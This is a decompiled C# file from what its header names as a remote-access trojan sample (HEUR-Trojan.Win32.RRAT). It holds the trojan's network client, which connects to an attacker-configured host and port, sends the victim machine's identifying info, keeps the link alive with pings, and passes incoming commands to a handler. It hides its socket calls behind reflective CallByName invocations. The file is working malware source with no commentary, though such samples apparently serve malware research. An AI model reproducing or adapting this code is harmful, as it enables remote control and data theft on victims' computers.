// Decompiled with JetBrains decompiler
// Type: Client
// Assembly: NoahClient, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A55B7EB4-612C-4348-ADA6-5D647EA578AF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.RRAT.gen-3378488a2930d73c433e9bbedbeb9065753dd5e236552aa80dd553a7e73ce693.exe

using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

public static class Client
{
  private static Socket client;
  public static bool isConnected;
  private static MemoryStream memoryStream;
  private static Timer keepAlivePacket;

  public static void Run() => new Thread(new ThreadStart(Client.TcpReceive)).Start();

  private static void TcpReceive()
  {
label_10:
    while (!Client.isConnected)
    {
      try
      {
        if (Client.memoryStream != null)
          Client.memoryStream.Dispose();
        if (Client.keepAlivePacket != null)
          Client.keepAlivePacket.Dispose();
      }
      catch
      {
      }
      try
      {
        Interaction.CallByName((object) Client.client, "Disconnect", CallType.Method, (object) false);
      }
      catch
      {
      }
      try
      {
        Client.client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        Interaction.CallByName((object) Client.client, "SendBufferSize", CallType.Let, (object) 999999);
        Interaction.CallByName((object) Client.client, "ReceiveBufferSize", CallType.Let, (object) 999999);
        Interaction.CallByName((object) Client.client, "Connect", CallType.Method, (object) Config.host, (object) Convert.ToInt32(Config.port));
        Client.isConnected = true;
        Client.TcpSend(IdGenerator.SendInfo());
        Client.keepAlivePacket = new Timer(new TimerCallback(Client.Ping), (object) null, 30000, 30000);
        Client.memoryStream = new MemoryStream();
      }
      catch
      {
        Client.isConnected = false;
        Thread.Sleep(3000);
      }
    }
label_18:
    while (Client.isConnected)
    {
      try
      {
        if (Client.client.Poll(-1, SelectMode.SelectRead) && Client.client.Available <= 0 || !Client.client.Connected)
        {
          Client.isConnected = false;
          break;
        }
        byte[] buffer = new byte[Client.client.Available];
        Interaction.CallByName((object) Client.client, "Receive", CallType.Method, (object) buffer, (object) 0, (object) buffer.Length, (object) SocketFlags.None);
        Client.memoryStream.Write(buffer, 0, buffer.Length);
        while (true)
        {
          if (StringConverter.BytestoString(Client.memoryStream.ToArray()).Contains(Config.splitter))
          {
            Array[] arrayArray = (Array[]) Client.PacketFixer(Client.memoryStream.ToArray(), Config.splitter);
            new Thread(new ParameterizedThreadStart(new PacketHandler().Handler)).Start((object) arrayArray[0]);
            Client.memoryStream.Dispose();
            Client.memoryStream = new MemoryStream();
            if (arrayArray.Length == 2)
              Client.memoryStream.Write((byte[]) arrayArray[1], 0, ((byte[]) arrayArray[1]).Length);
            else
              goto label_18;
          }
          else
            goto label_18;
        }
      }
      catch
      {
        Client.isConnected = false;
        break;
      }
    }
    goto label_10;
  }

  private static void Ping(object state)
  {
    Client.TcpSend((byte[]) typeof (StringConverter).GetMethod("StringToBytes").Invoke((object) null, new object[1]
    {
      (object) "keepAlivePing!"
    }));
    GC.Collect();
    GC.WaitForPendingFinalizers();
    GC.Collect();
  }

  private static void TcpSend(byte[] packet)
  {
    if (!Client.isConnected)
      return;
    try
    {
      using (MemoryStream ObjectRef = new MemoryStream())
      {
        Interaction.CallByName((object) ObjectRef, "Write", CallType.Method, (object) packet, (object) 0, (object) packet.Length);
        Interaction.CallByName((object) ObjectRef, "Write", CallType.Method, (object) StringConverter.StringToBytes(Config.splitter), (object) 0, (object) Config.splitter.Length);
        Interaction.CallByName((object) Client.client, "SendBufferSize", CallType.Let, (object) packet.Length);
        Interaction.CallByName((object) Client.client, "Poll", CallType.Method, (object) -1, (object) SelectMode.SelectWrite);
        Interaction.CallByName((object) Client.client, "Send", CallType.Method, (object) ObjectRef.ToArray(), (object) 0, (object) (int) ObjectRef.Length, (object) SocketFlags.None);
      }
    }
    catch
    {
      Client.isConnected = false;
    }
  }

  public static void TcpSend(string S) => Client.TcpSend(StringConverter.StringToBytes(S));

  private static Array PacketFixer(byte[] bytesArray, string splitter)
  {
    List<byte[]> numArrayList = new List<byte[]>();
    MemoryStream memoryStream1 = new MemoryStream();
    MemoryStream memoryStream2 = new MemoryStream();
    string[] strArray = Strings.Split(StringConverter.BytestoString(bytesArray), splitter, Compare: CompareMethod.Text);
    memoryStream1.Write(bytesArray, 0, strArray[0].Length);
    memoryStream2.Write(bytesArray, strArray[0].Length + splitter.Length, bytesArray.Length - (strArray[0].Length + splitter.Length));
    numArrayList.Add(memoryStream1.ToArray());
    numArrayList.Add(memoryStream2.ToArray());
    memoryStream1.Dispose();
    memoryStream2.Dispose();
    return (Array) numArrayList.ToArray();
  }
}
